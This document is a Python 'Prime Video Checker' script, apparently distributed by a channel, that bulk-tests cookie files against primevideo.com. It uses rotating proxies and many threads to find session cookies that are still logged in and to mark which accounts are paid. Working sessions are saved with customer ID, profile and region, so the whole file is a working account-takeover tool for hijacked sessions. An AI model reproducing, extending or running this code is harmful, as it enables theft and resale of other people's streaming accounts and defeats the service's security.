#!/usr/bin/env python3

import sys
import os
import copy
import hashlib
import json
import random
import re
import shutil
import string
import threading
import queue
import time
from datetime import datetime, timezone
from functools import lru_cache
import tkinter as tk
from tkinter import filedialog

import requests

try:
    import yaml
except ImportError:
    yaml = None

if os.name == 'nt':
    os.system('')

CHANNEL_NAME = "Sprojectchannel"

DEFAULT_CONFIG = {
    "txt_fields": {
        "profile": True,
        "region": True,
    },
    "retries": {
        "error_proxy_attempts": 3,
    },
}

BANNER = r"""
██████╗ ██████╗ ██╗███╗   ███╗███████╗    ██╗   ██╗██╗██████╗ ███████╗ ██████╗
██╔══██╗██╔══██╗██║████╗ ████║██╔════╝    ██║   ██║██║██╔══██╗██╔════╝██╔═══██╗
██████╔╝██████╔╝██║██╔████╔██║█████╗      ██║   ██║██║██║  ██║█████╗  ██║   ██║
██╔═══╝ ██╔══██╗██║██║╚██╔╝██║██╔══╝      ╚██╗ ██╔╝██║██║  ██║██╔══╝  ██║   ██║
██║     ██║  ██║██║██║ ╚═╝ ██║███████╗     ╚████╔╝ ██║██████╔╝███████╗╚██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝╚══════╝      ╚═══╝  ╚═╝╚═════╝ ╚══════╝ ╚═════╝
"""

RESULTS_DIR = os.path.join("results", "PRIMEVIDEO")
VALID_DIR = os.path.join(RESULTS_DIR, "valid")
os.makedirs(RESULTS_DIR, exist_ok=True)
os.makedirs(VALID_DIR, exist_ok=True)

FREE_FILE = os.path.join(RESULTS_DIR, "free.txt")
UNKNOWN_FILE = os.path.join(RESULTS_DIR, "unknown.txt")

_USE_COLOR = sys.stdout.isatty() or os.environ.get("TERM") in (
    "xterm", "xterm-256color", "screen")

if _USE_COLOR:
    RST    = "\033[0m"
    BOLD   = "\033[1m"
    DIM    = "\033[2m"
    GREEN  = "\033[38;5;46m"
    LGREEN = "\033[38;5;120m"
    RED    = "\033[38;5;203m"
    YEL    = "\033[38;5;220m"
    CYAN   = "\033[38;5;51m"
    MAG    = "\033[38;5;213m"
    GREY   = "\033[38;5;245m"
else:
    RST = BOLD = DIM = GREEN = LGREEN = RED = YEL = CYAN = MAG = GREY = ""


def out_c(t, color):
    return f"{color}{t}{RST}"


STOREFRONT_TIMEOUT = (8, 15)
CONFIG_TIMEOUT = (5, 8)
REQUEST_HEADERS = {
    "Host": "www.primevideo.com",
    "Connection": "keep-alive",
    "device-memory": "4",
    "sec-ch-device-memory": "4",
    "dpr": "1",
    "sec-ch-dpr": "1",
    "viewport-width": "1366",
    "sec-ch-viewport-width": "1366",
    "rtt": "100",
    "downlink": "2.7",
    "ect": "4g",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "sec-ch-ua-platform-version": '"19.0.0"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
    ),
    "Accept": (
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,"
        "image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
    ),
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Accept-Encoding": "identity",
}
REQUIRED_AUTH_COOKIE_KEYS = ("session-token", "x-main-av", "at-main", "ubid-main")
DUPLICATE_COOKIE_KEYS = (
    "session-token",
    "at-main-av",
    "x-main-av",
    "sess-at-main-av",
    "ubid-main-av",
    "session-id",
)
CONFIG_LOGGED_OUT_STATUS = 412
CONFIG_UNAVAILABLE_STATUS = 520


def clear_screen():
    try:
        os.system("cls" if os.name == "nt" else "clear")
    except Exception:
        print("\n" * 3)


def print_banner():
    clear_screen()
    print(BANNER)


def select_db_file():
    root = tk.Tk()
    root.withdraw()
    root.attributes("-topmost", True)
    file_path = filedialog.askopenfilename(
        title="[SELECT COOKIES]",
        filetypes=[("Text & JSON Files", "*.txt *.json"), ("All Files", "*.*")]
    )
    root.destroy()
    return file_path


def ensure_proxy_file(proxy_file="proxy.txt"):
    if not os.path.exists(proxy_file):
        with open(proxy_file, "w", encoding="utf-8") as f:
            f.write("# ip:port or ip:port:user:pass\n")


def sanitize_filename_part(value, fallback="UNKNOWN"):
    cleaned = str(value or "").strip()
    safe = re.sub(r'[<>:"/\\|?*\s]+', "_", cleaned).strip("._-")
    return safe or fallback


def write_text_file_safely(path, content):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    text_content = content if isinstance(content, str) else str(content or "")
    data = text_content.encode("utf-8", errors="replace")
    with open(path, "wb") as out_f:
        out_f.write(data)
        out_f.flush()


def build_valid_filepath(data, random_suffix):
    safe_region = sanitize_filename_part(data.get("region"), "UNKNOWN")
    safe_customer = sanitize_filename_part(data.get("customer_id"), "ID")
    safe_profile = sanitize_filename_part(data.get("profile"), "PROFILE")
    base_name = f"{safe_region}_{safe_customer}_{safe_profile}_{random_suffix}.txt"
    candidate = os.path.join(VALID_DIR, base_name)
    counter = 1
    while os.path.exists(candidate):
        candidate = os.path.join(VALID_DIR, f"{safe_region}_{safe_customer}_{safe_profile}_{random_suffix}_{counter}.txt")
        counter += 1
    return candidate


class TopStatus:
    NROWS = 5
    W     = 64
    BATCH_SIZE = 5

    def __init__(self, total):
        self.total = total
        self.checked = 0
        self.valid = 0
        self.free = 0
        self.unknown = 0
        self.bad = 0
        self.err = 0
        self.emitted = 0
        self.pending_lines = []
        self.start = time.time()
        self.lock = threading.Lock()
        self.enabled = sys.stdout.isatty()

    def _rows(self):
        el = time.time() - self.start
        cps = self.checked / max(el, 1e-3)

        l1_parts = [
            ("checked ", GREY), (f"{self.checked}/{self.total}", LGREEN),
            ("   valid ", GREY), (str(self.valid), GREEN),
            ("   free ", GREY), (str(self.free), CYAN),
        ]
        l1_plain = "".join(p[0] for p in l1_parts)
        l1_col   = "".join(out_c(p[0], p[1]) for p in l1_parts)

        l2_parts = [
            ("unknown ", GREY), (str(self.unknown), MAG),
            ("   bad ", GREY), (str(self.bad), RED),
            ("   err ", GREY), (str(self.err), YEL),
            ("   speed ", GREY), (f"{cps:.1f}/s", LGREEN),
            ("   time ", GREY), (f"{int(el)}s", LGREEN),
        ]
        l2_plain = "".join(p[0] for p in l2_parts)
        l2_col   = "".join(out_c(p[0], p[1]) for p in l2_parts)

        W = self.W

        def row(plain, col):
            pad = max(0, W - len(plain))
            return out_c("  │ ", GREY) + col + " " * pad + out_c(" │", GREY)

        return [
            out_c("  ╭─ live " + "─" * (W - 5) + "╮", GREY),
            row(l1_plain, l1_col),
            row(l2_plain, l2_col),
            out_c("  ╰" + "─" * (W + 2) + "╯", GREY),
            "",
        ]

    def draw_initial(self):
        if not self.enabled:
            return
        for r in self._rows():
            print(r)
        sys.stdout.flush()

    def _redraw(self):
        if not self.enabled:
            return
        up = self.NROWS + self.emitted
        sys.stdout.write(f"\033[{up}A")
        for r in self._rows():
            sys.stdout.write("\033[K" + r + "\n")
        if self.emitted > 0:
            sys.stdout.write(f"\033[{self.emitted}B")
        sys.stdout.flush()

    def _print_batch_unlocked(self, lines):
        if not lines:
            return
        for line in lines:
            print(line)
        self.emitted += len(lines)
        self._redraw()

    def bump(self, label):
        with self.lock:
            self.checked += 1
            if label == "VALID": self.valid += 1
            elif label == "FREE": self.free += 1
            elif label == "UNKNOWN": self.unknown += 1
            elif label == "BAD": self.bad += 1
            elif label in ("ERR", "DUPLICATE"): self.err += 1
            self._redraw()

    def emit(self, text, color=None):
        with self.lock:
            line = out_c(text, color) if color else text
            if not self.enabled:
                print(line)
                return
            self.pending_lines.append(line)
            if len(self.pending_lines) >= self.BATCH_SIZE:
                batch = self.pending_lines[:self.BATCH_SIZE]
                self.pending_lines = self.pending_lines[self.BATCH_SIZE:]
                self._print_batch_unlocked(batch)

    def flush(self):
        with self.lock:
            if self.pending_lines:
                batch = self.pending_lines[:]
                self.pending_lines.clear()
                self._print_batch_unlocked(batch)
            else:
                self._redraw()


def format_paid_label(is_paid):
    if is_paid is True:
        return "YES✅"
    if is_paid is False:
        return "NO❌"
    return "UNKNOWN⚠️"


def plan_label_from_paid_state(is_paid):
    if is_paid is True:
        return "Paid"
    if is_paid is False:
        return "Free"
    return "Unknown"


def result_type_from_paid_state(is_paid):
    if is_paid is True:
        return "success"
    return "free"


def _build_proxy_dict(scheme, host, port, user=None, password=None):
    host = host.strip()
    auth = ""
    if user is not None and password is not None:
        auth = f"{user}:{password}@"
    proxy_url = f"{scheme}://{auth}{host}:{port}"
    return {"http": proxy_url, "https": proxy_url}


def parse_proxy_line(line):
    raw = line.strip()
    if not raw or raw.startswith("#"):
        return None

    if "://" in raw:
        match = re.match(
            r"^(?P<scheme>[a-zA-Z0-9]+)://(?:(?P<user>[^:@]+):(?P<password>[^@]+)@)?(?P<host>[^:]+):(?P<port>\d+)$",
            raw,
        )
        if match:
            return _build_proxy_dict(
                match.group("scheme"),
                match.group("host"),
                match.group("port"),
                match.group("user"),
                match.group("password"),
            )

    if "@" in raw:
        left, right = raw.split("@", 1)
        if left.count(":") == 1 and right.count(":") == 1 and re.fullmatch(r"\d+", right.split(":")[1]):
            host, port = right.split(":")
            user, password = left.split(":")
            return _build_proxy_dict("http", host, port, user, password)
        if left.count(":") == 1 and right.count(":") == 1 and re.fullmatch(r"\d+", left.split(":")[1]):
            host, port = left.split(":")
            user, password = right.split(":")
            return _build_proxy_dict("http", host, port, user, password)

    parts = raw.split(":")
    if len(parts) == 2:
        return _build_proxy_dict("http", parts[0], parts[1])
    if len(parts) == 4:
        if re.fullmatch(r"\d+", parts[1]):
            return _build_proxy_dict("http", parts[0], parts[1], parts[2], parts[3])
        return _build_proxy_dict("http", parts[2], parts[3], parts[0], parts[1])
    return None


def load_proxies(proxy_file="proxy.txt"):
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, "r", encoding="utf-8", errors="ignore") as handle:
            for line in handle:
                proxy = parse_proxy_line(line)
                if proxy:
                    proxies.append(proxy)
    return proxies


def convert_json_to_netscape(json_data):
    if isinstance(json_data, dict) and isinstance(json_data.get("cookies"), list):
        json_data = json_data["cookies"]
    if not isinstance(json_data, list):
        raise ValueError("JSON cookie format is invalid")

    lines = []
    for cookie in json_data:
        domain = str(cookie.get("domain", ""))
        tail_match = "TRUE" if domain.startswith(".") else "FALSE"
        path = str(cookie.get("path", "/"))
        secure = "TRUE" if cookie.get("secure", False) else "FALSE"
        expires = (
            cookie.get("expirationDate")
            or cookie.get("expires")
            or cookie.get("expiry")
            or 0
        )
        name = str(cookie.get("name", ""))
        value = str(cookie.get("value", ""))
        lines.append(f"{domain}\t{tail_match}\t{path}\t{secure}\t{int(float(expires))}\t{name}\t{value}")
    return "\n".join(lines)


def is_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) < 7:
        return False
    if parts[1].upper() not in ("TRUE", "FALSE"):
        return False
    if parts[3].upper() not in ("TRUE", "FALSE"):
        return False
    return bool(re.fullmatch(r"-?\d+", parts[4].strip()))


def normalize_netscape_cookie_text(raw_text):
    clean_lines = []
    for line in raw_text.splitlines():
        if is_netscape_cookie_line(line):
            clean_lines.append(line.strip())
    return "\n".join(clean_lines)


def cookies_dict_from_netscape(netscape_text):
    cookies = {}
    for line in netscape_text.splitlines():
        parts = line.split("\t")
        if len(parts) >= 7:
            cookies[parts[5]] = parts[6]
    return cookies


def parse_cookie_file(cookie_path):
    with open(cookie_path, "r", encoding="utf-8", errors="ignore") as handle:
        content = handle.read()

    try:
        netscape_text = normalize_netscape_cookie_text(convert_json_to_netscape(json.loads(content)))
    except Exception:
        netscape_text = normalize_netscape_cookie_text(content)

    cookies = cookies_dict_from_netscape(netscape_text)
    return netscape_text, cookies


def has_required_auth_cookies(cookies):
    return any(key in cookies for key in REQUIRED_AUTH_COOKIE_KEYS)


def extract_with_patterns(text, patterns, default="Unknown"):
    for pattern in patterns:
        match = re.search(pattern, text, re.IGNORECASE | re.DOTALL)
        if match:
            value = match.group(1).strip()
            if value:
                return value
    return default


def has_known_value(value):
    normalized = str(value or "").strip()
    return bool(normalized) and normalized.lower() not in {
        "unknown",
        "unknown⚠️",
        "none",
        "null",
        "n/a",
        "unrecognised",
        "unrecognized",
    }


def normalize_identity_value(value):
    return str(value or "").strip().lower()


def build_cookie_signature(cookies):
    signature_parts = []
    for key in DUPLICATE_COOKIE_KEYS:
        value = str(cookies.get(key, "")).strip()
        if value:
            signature_parts.append(f"{key}={value}")
    if not signature_parts:
        return ""
    digest = hashlib.sha256("\n".join(signature_parts).encode("utf-8")).hexdigest()
    return f"cookie:{digest}"


def build_duplicate_key(data, cookies):
    customer_id = normalize_identity_value(data.get("customer_id"))
    if has_known_value(customer_id):
        return f"customer:{customer_id}"

    cookie_signature = build_cookie_signature(cookies)
    if cookie_signature:
        return cookie_signature

    profile = normalize_identity_value(data.get("profile"))
    region = normalize_identity_value(data.get("region"))
    metadata_parts = tuple(part for part in (profile, region) if has_known_value(part))
    if metadata_parts:
        return ("meta",) + metadata_parts
    return ""


def format_region_with_flag(region):
    normalized = str(region or "").strip()
    if not has_known_value(normalized):
        return "Unknown"
    code = normalized.upper()
    if len(code) == 2 and code.isalpha():
        base = ord("A")
        flag = chr(0x1F1E6 + ord(code[0]) - base) + chr(0x1F1E6 + ord(code[1]) - base)
        return f"{code} {flag}"
    return normalized


def find_first_value(obj, target_keys):
    if isinstance(target_keys, str):
        target_keys = {target_keys}
    else:
        target_keys = set(target_keys)

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in target_keys and value not in (None, ""):
                return value
            nested = find_first_value(value, target_keys)
            if nested not in (None, ""):
                return nested
    elif isinstance(obj, list):
        for item in obj:
            nested = find_first_value(item, target_keys)
            if nested not in (None, ""):
                return nested
    return None


def extract_prime_customer_id(source_text, config_data=None):
    customer_id = ""
    if isinstance(config_data, dict):
        customer_id = str(find_first_value(config_data, {"customerID", "customerId"}) or "").strip()
    if has_known_value(customer_id):
        return customer_id
    customer_id = extract_with_patterns(
        source_text,
        [
            r'"customerID"\s*:\s*"([^"]+)"',
            r'&#34;customerID&#34;\s*:\s*&#34;([^&]+)&#34;',
        ],
        default="",
    )
    return customer_id if has_known_value(customer_id) else ""


def extract_prime_region(source_text, config_data=None):
    region = ""
    if isinstance(config_data, dict):
        region = str(find_first_value(config_data, "recordTerritory") or "").strip()
    if has_known_value(region):
        return region
    return extract_with_patterns(
        source_text,
        [
            r'"recordTerritory"\s*:\s*"([^"]+)"',
            r'&#34;recordTerritory&#34;\s*:\s*&#34;([^&]+)&#34;',
        ],
        default="",
    )


def find_first_present_value(obj, target_keys):
    if isinstance(target_keys, str):
        target_keys = {target_keys}
    else:
        target_keys = set(target_keys)

    if isinstance(obj, dict):
        for key, value in obj.items():
            if key in target_keys:
                return True, value
            found, nested = find_first_present_value(value, target_keys)
            if found:
                return True, nested
    elif isinstance(obj, list):
        for item in obj:
            found, nested = find_first_present_value(item, target_keys)
            if found:
                return True, nested
    return False, None


def classify_configuration_customer_state(config_data, source_text=""):
    found_customer_id, customer_id = find_first_present_value(config_data, {"customerID", "customerId"})
    if not found_customer_id:
        customer_match = re.search(r'"customerID"\s*:\s*"([^"]*)"', source_text or "", re.IGNORECASE)
        if not customer_match:
            customer_match = re.search(r'"customerId"\s*:\s*"([^"]*)"', source_text or "", re.IGNORECASE)
        if not customer_match:
            customer_match = re.search(r'&#34;customerID&#34;\s*:\s*&#34;([^&]*)&#34;', source_text or "", re.IGNORECASE)
        if customer_match:
            found_customer_id = True
            customer_id = customer_match.group(1)

    normalized_customer_id = str(customer_id or "").strip()
    if not found_customer_id:
        return "unavailable", normalized_customer_id
    if has_known_value(normalized_customer_id):
        return "authenticated", normalized_customer_id
    return "logged_out", normalized_customer_id


def infer_signin_state(source_text, config_data=None, customer_id=""):
    if has_known_value(customer_id):
        return "signed_in"

    if re.search(r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)', source_text, re.IGNORECASE):
        return "signed_in"

    if 'data-testid="pv-nav-sign-out"' in source_text:
        return "signed_in"

    if 'data-testid="active-profile-' in source_text:
        return "signed_in"

    has_signin_link = 'data-testid="pv-nav-sign-in"' in source_text
    has_inactive_profile = 'data-testid="inactive-profile-placeholder"' in source_text
    has_signin_redirect = bool(re.search(r'/auth-redirect/[^"\']*signin=1', source_text, re.IGNORECASE))
    has_signin_form = bool(re.search(r'/(?:ap|gp)/signin|name=["\'](?:email|password)["\']', source_text, re.IGNORECASE))

    if has_signin_form or (has_signin_link and has_signin_redirect):
        return "sign_in_page"

    if has_inactive_profile and (has_signin_link or has_signin_redirect):
        return "sign_in_page"

    if isinstance(config_data, dict):
        config_customer_id = str(find_first_value(config_data, {"customerID", "customerId"}) or "").strip()
        if has_known_value(config_customer_id):
            return "signed_in"

    return "unknown"


def infer_prime_video_data(source_text, cookie_file, config_data=None):
    watchlist_match = re.search(
        r'"watchlistAction"\s*:\s*\{\s*"ajaxEnabled"\s*:\s*(true|false|null)',
        source_text,
        re.IGNORECASE,
    )
    watchlist_value = watchlist_match.group(1).lower() if watchlist_match else ""
    if watchlist_value == "true":
        is_paid = True
    elif watchlist_value == "false":
        is_paid = False
    elif re.search(r"subscribe now", source_text, re.IGNORECASE):
        is_paid = False
    else:
        is_paid = None

    profile = extract_with_patterns(
        source_text,
        [
            r'data-testid="active-profile-([^"]+)"',
            r'"profiles"\s*:\s*\[\{"name":"([^"]+)"',
            r'"displayName":"([^"]+)"',
        ],
        default="",
    )
    region = extract_prime_region(source_text, config_data)
    customer_id = extract_prime_customer_id(source_text, config_data)
    signin_state = infer_signin_state(source_text, config_data, customer_id)
    return {
        "profile": profile,
        "region": region,
        "watchlist_enabled": watchlist_value if watchlist_value else "unknown",
        "is_paid": is_paid,
        "paid_status": format_paid_label(is_paid),
        "plan": plan_label_from_paid_state(is_paid),
        "signin_state": signin_state,
        "source_file": cookie_file,
        "customer_id": customer_id,
    }


def classify_non_success_result(status_code=None, signin_state="unknown", last_exception=None):
    if signin_state == "sign_in_page" or status_code in {401, 403, CONFIG_LOGGED_OUT_STATUS}:
        return "failed"
    return "error"


def should_storefront_fallback_to_unknown(status_code, data):
    if status_code in (None, 200, 401, 403, CONFIG_LOGGED_OUT_STATUS):
        return False
    if not isinstance(data, dict):
        return False
    if data.get("signin_state") != "signed_in":
        return False
    return data.get("watchlist_enabled") != "unknown"


def set_unknown_plan_data(data):
    data["is_paid"] = None
    data["paid_status"] = format_paid_label(None)
    data["plan"] = plan_label_from_paid_state(None)
    return data


def get_prime_video_configuration(session, proxy=None):
    headers = dict(REQUEST_HEADERS)
    headers.update(
        {
            "Host": "atv-ps.primevideo.com",
            "Accept": "application/json, text/plain, */*",
            "Referer": "https://www.primevideo.com/region/eu/storefront",
        }
    )
    response = session.get(
        "https://atv-ps.primevideo.com/acm/GetConfiguration/WebClient?deviceTypeID=AOAGZA014O5RE&deviceID=Web",
        headers=headers,
        timeout=CONFIG_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    final_url = response.url or ""
    source_text = response.text or ""
    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return {}, 401, source_text
    if status_code != 200:
        return {}, status_code, source_text
    try:
        return response.json() or {}, status_code, source_text
    except Exception:
        match = re.search(r'"recordTerritory"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
        customer_match = re.search(r'"customerID"\s*:\s*"([^"]+)"', source_text, re.IGNORECASE)
        fallback = {}
        if match:
            fallback["recordTerritory"] = match.group(1).strip()
        if customer_match:
            fallback["customerID"] = customer_match.group(1).strip()
        return fallback, status_code, source_text


def get_prime_video_data(session, proxy=None):
    response = session.get(
        "https://www.primevideo.com/region/eu/storefront",
        headers=REQUEST_HEADERS,
        timeout=STOREFRONT_TIMEOUT,
        proxies=proxy,
        allow_redirects=True,
    )
    status_code = response.status_code
    final_url = response.url or ""
    source_text = response.text or ""

    if status_code != 200:
        return None, status_code, {}

    if "signin" in final_url.lower() or "ap/signin" in final_url.lower():
        return source_text, 401, {}

    config_data, config_status_code, _ = get_prime_video_configuration(session, proxy)
    if config_status_code != 200:
        return source_text, config_status_code, config_data
    customer_state, _ = classify_configuration_customer_state(config_data, _)
    if customer_state == "logged_out":
        return source_text, CONFIG_LOGGED_OUT_STATUS, config_data
    if customer_state == "unavailable":
        return source_text, CONFIG_UNAVAILABLE_STATUS, config_data
    return source_text, status_code, config_data


def format_cookie_file(data, cookie_content):
    lines = []
    region = data.get("region") if has_known_value(data.get("region")) else "Unknown"

    if has_known_value(data.get("profile")):
        lines.append(f"Profile: {data.get('profile')}")
    lines.append(f"Region: {region}")
    lines.append(f"Plan: {data.get('plan', 'Unknown')}")
    lines.append("")
    lines.append(f"=== Checked by {CHANNEL_NAME} ===")
    lines.append("")
    lines.append(cookie_content.strip())
    lines.append("")
    return "\n".join(lines)


def worker_task(cookie_queue, proxies, status_box, file_locks, seen_keys, dedupe_lock, max_retry_attempts, retryable_status_codes):
    while True:
        try:
            cookie_file = cookie_queue.get_nowait()
        except queue.Empty:
            break

        cookie_path = os.path.join("cookies", cookie_file)

        try:
            netscape_content, cookies = parse_cookie_file(cookie_path)
            if not cookies or not has_required_auth_cookies(cookies):
                status_box.bump("BAD")
                status_box.emit(f"  [BAD] {cookie_file}", RED)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
                cookie_queue.task_done()
                continue

            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update({"Accept-Encoding": "identity"})

            source_text = None
            status_code = None
            config_data = {}

            for attempt in range(max_retry_attempts):
                proxy_dict = random.choice(proxies) if proxies else None
                try:
                    source_text, status_code, config_data = get_prime_video_data(session, proxy_dict)
                    if status_code == 200 and source_text:
                        break
                    if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                        continue
                    break
                except Exception:
                    if attempt < max_retry_attempts - 1:
                        continue

            if source_text:
                data = infer_prime_video_data(source_text, cookie_file, config_data)
                if data.get("signin_state") == "sign_in_page":
                    status_box.bump("BAD")
                    status_box.emit(f"  [FAIL] {cookie_file}", RED)
                    if os.path.exists(cookie_path):
                        os.remove(cookie_path)
                    cookie_queue.task_done()
                    continue
            else:
                data = None

            if status_code == 200 and source_text:
                is_paid = data.get("is_paid")
                if is_paid is None:
                    is_paid = False
                    data["is_paid"] = False
                    data["paid_status"] = format_paid_label(False)
                    data["plan"] = plan_label_from_paid_state(False)

                dedupe_key = build_duplicate_key(data, cookies)
                is_duplicate = False
                if dedupe_key:
                    with dedupe_lock:
                        if dedupe_key in seen_keys:
                            is_duplicate = True
                        else:
                            seen_keys.add(dedupe_key)

                formatted_cookie = format_cookie_file(data, netscape_content)
                random_suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=5))

                if is_duplicate:
                    status_box.bump("BAD")
                    status_box.emit(f"  [DUP] {cookie_file}", YEL)
                elif is_paid:
                    status_box.bump("VALID")
                    line_info = f"{cookie_file} | Plan: {data.get('plan')} | Region: {data.get('region')}"
                    status_box.emit(f"  [VALID] " + line_info, LGREEN)
                    valid_path = build_valid_filepath(data, random_suffix)
                    with file_locks["valid"]:
                        write_text_file_safely(valid_path, formatted_cookie)
                else:
                    status_box.bump("FREE")
                    line_info = f"{cookie_file} | Plan: FREE"
                    status_box.emit(f"  [FREE] " + line_info, CYAN)
                    with file_locks["free"]:
                        with open(FREE_FILE, "a", encoding="utf-8") as f:
                            f.write(formatted_cookie + "\n" + "=" * 40 + "\n")

                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            else:
                status_box.bump("BAD")
                status_box.emit(f"  [ERR] {cookie_file}", RED)
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
        except Exception:
            status_box.bump("ERR")
            status_box.emit(f"  [ERR] {cookie_file}", YEL)
            try:
                if os.path.exists(cookie_path):
                    os.remove(cookie_path)
            except Exception:
                pass

        cookie_queue.task_done()


def main():
    print_banner()
    print(out_c("=======================================================", GREEN))
    print(out_c(" >>> PRIME VIDEO CHECKER", LGREEN))
    print(out_c(f" Channel: {CHANNEL_NAME}", CYAN))
    print(out_c("=======================================================", GREEN) + "\n")

    if not os.path.exists("cookies"):
        os.makedirs("cookies", exist_ok=True)

    cookie_files = [name for name in os.listdir("cookies") if name.lower().endswith((".txt", ".json"))]
    if not cookie_files:
        print(out_c("  [!] no cookies in 'cookies/' (.txt / .json).", YEL))
        input(out_c("  [enter] exit...", GREY))
        return

    total_cookies = len(cookie_files)
    print(out_c(f"  [+] {total_cookies} cookies loaded.", GREEN))

    proxy_opt = input(out_c("  [?] proxies [y/N]: ", LGREEN)).strip().lower()
    proxies = []

    if proxy_opt in ("y", "yes", "1", "s", "sim"):
        proxy_file = "proxy.txt"
        ensure_proxy_file(proxy_file)
        proxies = load_proxies(proxy_file)
        if proxies:
            print(out_c(f"  [+] {len(proxies)} proxies loaded.", LGREEN))
        else:
            print(out_c("  [!] proxy.txt empty. running direct.", YEL))
    else:
        print(out_c("  [*] direct.", GREY))

    try:
        threads_count = int(input(out_c("  [?] threads [10]: ", LGREEN)).strip() or "10")
        if threads_count < 1:
            threads_count = 10
    except ValueError:
        threads_count = 10

    cookie_queue = queue.Queue()
    for cf in cookie_files:
        cookie_queue.put(cf)

    file_locks = {
        "valid": threading.Lock(),
        "free": threading.Lock(),
    }

    seen_keys = set()
    dedupe_lock = threading.Lock()
    max_retry_attempts = 3
    retryable_status_codes = {429, 500, 502, 503, 504, CONFIG_UNAVAILABLE_STATUS}

    print()
    print(out_c("  ┌──────────────────────────────────────────────┐", GREY))
    print(out_c("  │", GREY) + f"  cookies : {out_c(str(total_cookies), LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  │", GREY) + f"  threads : {out_c(str(threads_count), LGREEN):<34}" + out_c("│", GREY))
    mode = "direct" if not proxies else f"{len(proxies)} proxies"
    print(out_c("  │", GREY) + f"  proxy   : {out_c(mode, LGREEN):<34}" + out_c("│", GREY))
    print(out_c("  └──────────────────────────────────────────────┘", GREY))
    print()

    status_box = TopStatus(total=total_cookies)
    status_box.draw_initial()

    start_time = time.time()

    threads = []
    for _ in range(min(threads_count, total_cookies)):
        t = threading.Thread(
            target=worker_task,
            args=(cookie_queue, proxies, status_box, file_locks, seen_keys, dedupe_lock, max_retry_attempts, retryable_status_codes)
        )
        t.daemon = True
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    status_box.flush()
    elapsed = time.time() - start_time

    print("\n")
    print(out_c("  ╔══════════════════════════════════════════════╗", GREEN))

    def boxline(text, color=LGREEN, w=46):
        print(out_c("  ║", GREEN) + out_c(text.center(w), color) + out_c("║", GREEN))

    boxline(f"   DONE  ·  {elapsed:.1f}s")
    boxline(f"   valid {status_box.valid}  ·  free {status_box.free}", GREY)
    boxline("   valid: results/PRIMEVIDEO/valid/", GREY)
    print(out_c("  ╚══════════════════════════════════════════════╝", GREEN))
    print()


if __name__ == "__main__":
    main()